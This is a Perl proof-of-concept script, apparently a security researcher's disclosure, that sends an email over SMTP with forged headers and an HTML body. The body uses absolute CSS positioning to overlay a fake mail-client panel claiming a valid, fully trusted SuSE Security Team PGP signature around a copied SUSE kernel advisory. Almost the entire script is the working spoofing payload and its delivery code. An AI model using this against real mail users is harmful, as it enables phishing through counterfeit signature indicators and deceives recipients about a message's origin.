#!/usr/bin/perl -w
#
# By Noam Rathaus - Beyond Security

use IO::Socket;
use strict;

my $Host = shift;

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $Host, PeerPort => "smtp");

unless ($remote) { die "cannot connect to SMTP daemon on $Host" }

print "connected\n";

waitfor($remote, "220 ");

print "HELO\n";
print $remote "HELO whatever.com\r\n";

waitfor($remote, "250 ");

print "MAIL FROM\n";
print $remote "MAIL FROM: test\@whoever.com\r\n";

waitfor($remote, "250 ");

print "RCPT TO\n";
print $remote "RCPT TO: testy\@whoever.com\r\n";

waitfor($remote, "250 ");

print "DATA\n";
print $remote "DATA\r\n";

waitfor($remote, "354 ");

print $remote <<_EOF_;
From: newone\@whoever.com\r
Subject: Test Case\r
To: oldone\@whoever.com\r
Date: Mon, 27 Dec 2004 01:43:24 -0600\r
MIME-version: 1.0\r
Content-type: text/html; charset="utf8"\r
Content-transfer-encoding: 8bit\r
\r
<HTML>\r
<BODY>\r
<BR>\r
<SPAN STYLE="font-family: arial; position: absolute; left: 0px; top: 0px; background: white; width: 99%; margin-left: 10px; margin-top: 10px;">\r
<TABLE STYLE="width: 100%; background: white; border: 1px solid; margin-left: auto; margin-right: auto;" CELLSPACING="0" CELLPADDING="2">\r
 <TR>\r
  <TD COLSPAN="2" STYLE="background: #ffdd76;"><B>Microsoft Alert</B></TD>\r
 </TR>\r
 <TR STYLE="background: #eeeee6;">\r
  <TD WIDTH="1"><B>From:</B></TD><TD><A HREF="mailto:suse\@suse.com">suse\@suse.com</A></TD>\r
 </TR>\r
 <TR STYLE="background: #eeeee6;">\r
  <TD><B>To:</B></TD><TD><A HREF="mailto:test\@whoever.com">test\@whoever.com</A></TD>\r
 </TR>\r
 <TR STYLE="background: #eeeee6;">\r
  <TD><B>Date:</B></TD><TD>2004-12-27 09:43</TD>\r
 </TR>\r
</TABLE>\r
<BR>\r
<TABLE STYLE="width: 99%; margin-left: 10px; background: white; border: 1px solid; border-color: #40FF40; margin-left: auto; margin-right: auto;" CELLSPACING="0" CELLPADDING="2">
 <TR>\r
  <TD STYLE="background: #40FF40;"><B>Message was signed by <A HREF="mailto:security\@suse.de">SuSE Security Team <security\@suse.de></A> (Key ID: 0x3D25D3D9).<BR>
  The signature is valid and the key is fully trusted.</B></TD>\r
 </TR>\r
 <TR>
  <TD STYLE="background: #e8ffe8;">
<PRE>______________________________________________________________________________

                        SUSE Security Announcement

        Package: kernel
        Announcement-ID: SUSE-SA:2004:046
        Date: Wednesday, Dec 22nd 2004 16:00 MEST
        Affected products: 9.0 / AMD64
                                SUSE Linux Enterprise Server 8 / AMD64
        Vulnerability Type: local privilege escalation
        Severity (1-10): 8
        SUSE default package: yes
        Cross References: CAN-2004-1144

    Content of this advisory:
        1) security vulnerability resolved:
             - local root exploit in 2.4 AMD64 kernel
           problem description
        2) solution/workaround
        3) special instructions and notes
        4) package location and checksums
        5) pending vulnerabilities, solutions, workarounds:
            - see SUSE Security Summary
        6) standard appendix (further information)

______________________________________________________________________________

1) problem description, brief discussion

    Due to missing argument checking in the 32 bit compatibility
    system call handler in the 2.4 Linux Kernel on the AMD64 platform
    a local attacker can gain root access using a simple program.

    This issue was found and fixed by Petr Vandrovec and has been
    assigned the Mitre CVE ID CAN-2004-1144.

    This is a 2.4 Kernel and AMD64 specific problem, other
    architectures and the 2.6 Kernel are not affected.


2) solution/workaround

    There is no workaround, please install the supplied kernels.

3) special instructions and notes

    SPECIAL INSTALL INSTRUCTIONS:
    ==============================
    The following paragraphs will guide you through the installation
    process in a step-by-step fashion. The character sequence "****"
    marks the beginning of a new paragraph. In some cases, the steps
    outlined in a particular paragraph may or may not be applicable
    to your situation.
    Therefore, please make sure to read through all of the steps below
    before attempting any of these procedures.
    All of the commands that need to be executed are required to be
    run as the superuser (root). Each step relies on the steps before
    it to complete successfully.


  **** Step 1: Determine the needed kernel type

    Please use the following command to find the kernel type that is
    installed on your system:

      rpm -qf /boot/vmlinuz

    Following are the possible kernel types (disregard the version and
    build number following the name separated by the "-" character)

      k_deflt # default kernel, good for most systems.
      k_i386 # kernel for older processors and chip sets
      k_athlon # kernel made specifically for AMD Athlon(tm) family processors
      k_psmp # kernel for Pentium-I dual processor systems
      k_smp # kernel for SMP systems (Pentium-II and above)
      k_smp4G # kernel for SMP systems which supports a maximum of 4G of RAM
      kernel-64k-pagesize
      kernel-bigsmp
      kernel-default
      kernel-smp

  **** Step 2: Download the package for your system

    Please download the kernel RPM package for your distribution with the
    name as indicated by Step 1. The list of all kernel rpm packages is
    appended below. Note: The kernel-source package does not
    contain a binary kernel in bootable form. Instead, it contains the
    sources that the binary kernel rpm packages are created from. It can be
    used by administrators who have decided to build their own kernel.
    Since the kernel-source.rpm is an installable (compiled) package that
    contains sources for the linux kernel, it is not the source RPM for
    the kernel RPM binary packages.

    The kernel RPM binary packages for the distributions can be found at the
    locations below ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64.

    After downloading the kernel RPM package for your system, you should
    verify the authenticity of the kernel rpm package using the methods as
    listed in section 3) of each SUSE Security Announcement.


  **** Step 3: Installing your kernel rpm package

    Install the rpm package that you have downloaded in Steps 3 or 4 with
    the command
        rpm -Uhv --nodeps --force <K_FILE.RPM>
    where <K_FILE.RPM> is the name of the rpm package that you downloaded.

    Warning: After performing this step, your system will likely not be
             able to boot if the following steps have not been fully
             followed.


    If you run SUSE LINUX 8.1 and haven't applied the kernel update
    (SUSE-SA:2003:034), AND you are using the freeswan package, you also
    need to update the freeswan rpm as a dependency as offered
    by YOU (YaST Online Update). The package can be downloaded from
    ftp://ftp.suse.com/pub/suse/i386/update/8.1/rpm/i586/

  **** Step 4: configuring and creating the initrd

    The initrd is a ramdisk that is loaded into the memory of your
    system together with the kernel boot image by the bootloader. The
    kernel uses the content of this ramdisk to execute commands that must
    be run before the kernel can mount its actual root filesystem. It is
    usually used to initialize SCSI drivers or NIC drivers for diskless
    operation.

    The variable INITRD_MODULES in /etc/sysconfig/kernel determines
    which kernel modules will be loaded in the initrd before the kernel
    has mounted its actual root filesystem. The variable should contain
    your SCSI adapter (if any) or filesystem driver modules.

    With the installation of the new kernel, the initrd has to be
    re-packed with the update kernel modules. Please run the command

      mk_initrd

    as root to create a new init ramdisk (initrd) for your system.
    On SuSE Linux 8.1 and later, this is done automatically when the
    RPM is installed.


  **** Step 5: bootloader

    If you run a SUSE LINUX 8.x, SLES8, or SUSE LINUX 9.x system, there
    are two options:
    Depending on your software configuration, you have either the lilo
    bootloader or the grub bootloader installed and initialized on your
    system.
    The grub bootloader does not require any further actions to be
    performed after the new kernel images have been moved in place by the
    rpm Update command.
    If you have a lilo bootloader installed and initialized, then the lilo
    program must be run as root. Use the command

      grep LOADER_TYPE /etc/sysconfig/bootloader

    to find out which boot loader is configured. If it is lilo, then you
    must run the lilo command as root. If grub is listed, then your system
    does not require any bootloader initialization.

    Warning: An improperly installed bootloader may render your system
             unbootable.

  **** Step 6: reboot

    If all of the steps above have been successfully completed on your
    system, then the new kernel including the kernel modules and the
    initrd should be ready to boot. The system needs to be rebooted for
    the changes to become active. Please make sure that all steps have
    completed, then reboot using the command
        shutdown -r now
    or
        init 6

    Your system should now shut down and reboot with the new kernel.


4) package location and checksums

    Please download the update package for your distribution and verify its
    integrity by the methods listed in section 3) of this announcement.
    Then, install the package using the command "rpm -Fhv file.rpm" to apply
    the update.
    Our maintenance customers are being notified individually. The packages
    are being offered to install from the maintenance web.

    x86-64 Platform:

    SUSE Linux 9.0:
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/k_deflt-2.4.21-268.x86_64.rpm
      585c7dd47f8e6f9e60ae4eed5fbb21fe
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/k_smp-2.4.21-268.x86_64.rpm
      44b0c5e8beae0d1b60b85f0f1406a4f9
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/kernel-source-2.4.21-268.x86_64.rpm
      000194dc37b15a93c8b0313288c9c879
    source rpm(s):
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/k_deflt-2.4.21-268.src.rpm
      3f0a9d938251f2d72fce0ccc979c19a1
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/k_smp-2.4.21-268.src.rpm
      33b072ab6ef6333f42bda07a5de7e658
    ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/kernel-source-2.4.21-268.src.rpm
      772c469c0907594d6396918a5d4c91f6
______________________________________________________________________________

5) Pending vulnerabilities in SUSE Distributions and Workarounds:

    See the SUSE Security Summary Report for more information.

______________________________________________________________________________

6) standard appendix: authenticity verification, additional information

  - Package authenticity verification:

    SUSE update packages are available on many mirror ftp servers all over
    the world. While this service is being considered valuable and important
    to the free and open source software community, many users wish to be
    sure about the origin of the package and its content before installing
    the package. There are two verification methods that can be used
    independently from each other to prove the authenticity of a downloaded
    file or rpm package:
    1) md5sums as provided in the (cryptographically signed) announcement.
    2) using the internal gpg signatures of the rpm package.

    1) execute the command
        md5sum <name-of-the-file.rpm>
       after you downloaded the file from a SUSE ftp server or its mirrors.
       Then, compare the resulting md5sum with the one that is listed in the
       announcement. Since the announcement containing the checksums is
       cryptographically signed (usually using the key security\@suse.de),
       the checksums show proof of the authenticity of the package.
       We disrecommend to subscribe to security lists which cause the
       email message containing the announcement to be modified so that
       the signature does not match after transport through the mailing
       list software.
       Downsides: You must be able to verify the authenticity of the
       announcement in the first place. If RPM packages are being rebuilt
       and a new version of a package is published on the ftp server, all
       md5 sums for the files are useless.

    2) rpm package signatures provide an easy way to verify the authenticity
       of an rpm package. Use the command
        rpm -v --checksig <file.rpm>
       to verify the signature of the package, where <file.rpm> is the
       filename of the rpm package that you have downloaded. Of course,
       package authenticity verification can only target an un-installed rpm
       package file.
       Prerequisites:
        a) gpg is installed
        b) The package is signed using a certain key. The public part of this
           key must be installed by the gpg program in the directory
           ~/.gnupg/ under the user's home directory who performs the
           signature verification (usually root). You can import the key
           that is used by SUSE in rpm packages for SUSE Linux by saving
           this announcement to a file ("announcement.txt") and
           running the command (do "su -" to be root):
            gpg --batch; gpg < announcement.txt | gpg --import
           SUSE Linux distributions version 7.1 and thereafter install the
           key "build\@suse.de" upon installation or upgrade, provided that
           the package gpg is installed. The file containing the public key
           is placed at the top-level directory of the first CD (pubring.gpg)
           and at ftp://ftp.suse.com/pub/suse/pubring.gpg-build.suse.de .


  - SUSE runs two security mailing lists to which any interested party may
    subscribe:

    suse-security\@suse.com
        - general/linux/SUSE security discussion.
            All SUSE security announcements are sent to this list.
            To subscribe, send an email to
                <suse-security-subscribe\@suse.com>.

    suse-security-announce\@suse.com
        - SUSE's announce-only mailing list.
            Only SUSE's security announcements are sent to this list.
            To subscribe, send an email to
                <suse-security-announce-subscribe\@suse.com>.

    For general information or the frequently asked questions (FAQ)
    send mail to:
        <suse-security-info\@suse.com> or
        <suse-security-faq\@suse.com> respectively.

    =====================================================================
    SUSE's security contact is <security\@suse.com> or <security\@suse.de>.
    The <security\@suse.de> public key is listed below.
    =====================================================================
______________________________________________________________________________

    The information in this advisory may be distributed or reproduced,
    provided that the advisory is not modified in any way. In particular,
    it is desired that the clear-text signature shows proof of the
    authenticity of the text.
    SUSE Linux AG makes no warranties of any kind whatsoever with respect
    to the information contained in this security advisory.

Type Bits/KeyID Date User ID
pub 2048R/3D25D3D9 1999-03-06 SuSE Security Team <security\@suse.de>
pub 1024D/9C800ACA 2000-10-19 SuSE Package Signing Key <build\@suse.de>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.7 (GNU/Linux)

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
-Fv2n
-----END PGP PUBLIC KEY BLOCK-----
</PRE>
</TD>
 </TR>
 <TR>
  <TD STYLE="background: #40FF40;"><B>End of signed message</B></TD>
 </TR>
</TABLE>
<BR>\r
</SPAN>\r
</BODY>\r
</HTML>\r
\r
.\r
_EOF_

waitfor($remote, "250 ");

close ($remote);

sub waitfor
{
 my ($socket, $WaitFor) = @_;

 while (<$socket>)
 {
  print $_;
  if (/$WaitFor/)
  {
   last;
  }
 }
}
